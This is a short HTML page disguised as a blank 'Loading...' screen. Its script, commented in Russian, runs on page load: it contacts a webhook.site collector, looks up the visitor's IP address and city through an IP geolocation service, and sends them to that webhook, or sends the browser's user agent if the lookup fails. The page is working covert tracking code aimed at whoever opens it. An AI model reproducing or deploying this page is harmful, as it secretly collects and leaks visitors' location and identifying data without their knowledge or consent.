<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Loading...</title></head>
<body style="background:black;">
<script>
    // Самая простая отправка
    const hook = "https://webhook.site/6729bab1-8bc8-475e-8a94-1bb9e1c033d2";
    
    // 1. Сначала просто "стучимся", чтобы ты увидел запрос в списке
    fetch(hook, { mode: 'no-cors' });

    // 2. Пробуем собрать данные об IP
    fetch("https://ipapi.co/json/")
        .then(r => r.json())
        .then(data => {
            // Если узнали IP, отправляем еще раз с данными
            fetch(hook + "?ip=" + data.ip + "&city=" + data.city, { mode: 'no-cors' });
        })
        .catch(() => {
            // Если IP заблокирован, шлем просто инфу о браузере
            fetch(hook + "?info=" + encodeURIComponent(navigator.userAgent), { mode: 'no-cors' });
        });
</script>
</body>
</html>
